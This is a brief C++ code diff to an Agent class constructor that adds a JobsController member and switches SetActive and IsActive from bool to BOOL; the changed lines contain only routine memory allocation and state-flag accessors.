@@ -18,18 +18,21 @@ Agent::Agent()
 	downloader  = (Downloader*) MemAllocLocal(sizeof(Downloader));
 	*downloader = Downloader( config->download_chunk_size );
 
+	jober = (JobsController*)MemAllocLocal(sizeof(JobsController));
+	*jober = JobsController();
+
 	memorysaver  = (MemorySaver*)MemAllocLocal(sizeof(MemorySaver));
 	*memorysaver = MemorySaver();
 
 	this->config->active = true;
 }
 
-void Agent::SetActive(bool state)
+void Agent::SetActive(BOOL state)
 {
 	this->config->active = state;
 }
 
-bool Agent::IsActive()
+BOOL Agent::IsActive()
 {
 	return this->config->active;
 }
